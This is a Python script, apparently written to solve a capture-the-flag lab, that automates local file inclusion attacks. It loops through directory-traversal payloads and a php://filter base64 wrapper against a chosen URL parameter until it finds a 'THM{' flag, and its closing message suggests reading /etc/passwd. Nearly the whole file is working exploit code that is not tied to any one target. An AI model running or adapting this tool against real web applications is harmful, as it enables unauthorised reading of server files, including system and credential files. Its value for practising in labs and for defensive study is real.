import requests
import sys
import base64
from colorama import Fore, Style, init

init(autoreset=True)
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
END = Style.RESET_ALL

def print_banner():
    print(f"{YELLOW}╔══════════════════════════════════════╗{END}")
    print(f"{YELLOW}║ CTF LFI AUTO SOLVER by UZMA ║{END}")
    print(f"{YELLOW}╚══════════════════════════════════════╝{END}")

def test_lfi(target_url, param_name, prefix_val):
    print(f"{YELLOW}[*] Target: {target_url}{END}")
    print(f"{YELLOW}[*] Parameter: {param_name}{END}")
    print(f"{YELLOW}[*] Prefix: {prefix_val}{END}\n")

    payloads = [
        "../../../../../../../../flag",
        "../../../../../../../../flag.txt",
        "../../../../../../flag",
        "../../../../../../flag.txt",
        "../../../../../flag",
        "../../../../../flag.txt",
        "../../../../flag",
        "../../../../flag.txt"
    ]

    for path in payloads:
        test_url = f"{target_url}?{param_name}={prefix_val}{path}"
        print(f"{YELLOW}[*] Checking: {path}{END}")

        try:
            r = requests.get(test_url, timeout=5)
            if "THM{" in r.text:
                print(f"{GREEN}[+] FLAG FOUND!{END}")
                print(f"{GREEN}[+] URL: {test_url}{END}")
                print(f"{GREEN}[+] FLAG: {r.text}{END}")
                return True
        except:
            pass

        test_url2 = f"{target_url}?{param_name}=php://filter/convert.base64-encode/resource={prefix_val}{path}"
        try:
            r2 = requests.get(test_url2, timeout=5)
            if "VGhN" in r2.text or "VEhN" in r2.text:
                try:
                    decoded = base64.b64decode(r2.text.strip()).decode()
                    if "THM{" in decoded:
                        print(f"{GREEN}[+] FLAG FOUND with PHP Filter!{END}")
                        print(f"{GREEN}[+] URL: {test_url2}{END}")
                        print(f"{GREEN}[+] FLAG: {decoded}{END}")
                        return True
                except:
                    pass
        except:
            pass

        print(f"{RED}[-] Tried: {path}{END}", end='\r')

    print(f"\n{RED}[-] Flag not found. Try increasing../ or check /etc/passwd first{END}")
    return False

if __name__ == "__main__":
    print_banner()

    if len(sys.argv) != 4:
        print(f"Usage: python solver.py <URL> <PARAM> <PREFIX>")
        print(f"Example: python solver.py http://10.49.182.104 view dog")
        sys.exit(1)

    target_url = sys.argv[1]
    param_name = sys.argv[2]
    prefix_val = sys.argv[3]

    test_lfi(target_url, param_name, prefix_val)
